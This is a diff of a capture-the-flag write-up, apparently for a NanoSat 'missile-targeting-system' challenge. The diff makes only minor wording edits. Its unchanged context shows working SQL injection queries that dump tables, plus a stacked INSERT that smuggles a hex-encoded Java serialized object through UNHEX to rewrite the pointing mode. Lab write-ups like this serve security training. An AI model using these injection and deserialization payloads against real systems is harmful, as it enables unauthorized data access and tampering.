@@ -1398,7 +1398,7 @@ Wombley thinks he may have left the admin tools open. I should check for those i
 </details>
 <h2 id="solution">Solution<a class="headerlink" href="#solution" title="Permanent link">⚓︎</a></h2>
 <p>To get started, establish VNC connection to the NanoSat container and create the Wireguard VPN tunnel just as in <a href="../o21/">Camera Access</a> challenge.
-Once setup is complete, start the challenge.
+Once the setup is complete, start the challenge.
 Let's launch NanoSat MO Base Station Tool and connect to the directory.</p>
 <p><img alt="Start" src="../../img/objectives/o22/start.jpg" /></p>
 <p>Connect to <code>AppsLauncher</code> service and start <code>missile-targeting-system</code> app.</p>
@@ -1438,14 +1438,14 @@ Ok now let's dump all column names using this query:<br/>
 <p>In this query, <code>id, numerical_mode, str_mode, str_desc</code> are column names and <code>pointing_mode_to_str</code> is the table.<br/>
 <i>Note: In Wireshark, start capturing then follow TCP stream as in <a href="../o21/">Camera Access</a> challenge.</i></p>
 <p><img alt="pointing_mode_to_str" src="../../img/objectives/o22/pointing_mode_to_str.jpg" /></p>
-<p>Apply a lil bit of format editing to learn that we need to have <code>targeting_mode</code> be set to 1 to point missile towards the Sun instead of the Earth.</p>
+<p>Apply a bit of format editing to learn that we need to have <code>targeting_mode</code> be set to 1 to point missile towards the Sun instead of the Earth.</p>
 <p><img alt="parsed" src="../../img/objectives/o22/parsed.jpg" /></p>
 <p>Obviously, right now the missile points towards the Earth(0):<br/>
 <code>union all SELECT json_arrayagg(concat_ws(0x3a,id, numerical_mode)) from pointing_mode;</code></p>
 <p><img alt="Earth" src="../../img/objectives/o22/earth.jpg" /></p>
 <p>We know that the only table that gives us any write access is <code>INSERT</code> in <code>satellite_query</code>. <br/>
 Let's dump this table, column by column: <code>union all select TO_BASE64(object) from satellite_query;</code><br/>
-The <code>TO_BASE64</code> SQL function can be used to safely transfer binary data - copy over Base64 string, decode, and save as an unknown file type for now (be sure to properly format out new lines). </p>
+The <code>TO_BASE64</code> SQL function can be used to safely transfer binary data - copy over Base64 string, decode, and save as an unknown file type for now (be sure to properly format out new lines in Base64). </p>
 <p><img alt="Object" src="../../img/objectives/o22/object.jpg" /></p>
 <p>Now find out what kind of data this is - it's Java serialization data and looks like a function call.</p>
 <p><img alt="Data Type" src="../../img/objectives/o22/datatype.jpg" /></p>
@@ -1716,7 +1716,7 @@ Let's create <code>CallIt.java</code></p>
 <span class="p">}</span>
 </code></pre></div></td></tr></table></div>
 <p><code>java_out</code> is the serialized Java object call to <code>SatelliteQueryFileFolderUtility</code> in its bytecode form, updating the <code>pointing_mode</code> table to set its mode to point to the Sun (<code>1</code>).
-Now convert the binary into hex so we can send the statement without issues - Notepad++ can be used:</p>
+Now convert the binary into hex so we can send the statement without issues (it's required) - Notepad++ can be used:</p>
 <p><img alt="Hex Payload" src="../../img/objectives/o22/hex.jpg" /></p>
 <p>The final <code>INSERT</code> query with payload should look like this, using native SQL function <code>UNHEX</code>:<br/>
 <code>union all select @@version; insert into satellite_query (object) VALUES (UNHEX('ACED00057372001F536174656C6C697465517565727946696C65466F6C6465725574696C69747912D4F68D0EB392CB0200035A0007697351756572795A000869735570646174654C000F706174684F7253746174656D656E747400124C6A6176612F6C616E672F537472696E673B7870010174003575706461746520706F696E74696E675F6D6F646520736574206E756D65726963616C5F6D6F64653D312077686572652069643D313B'));</code></p>
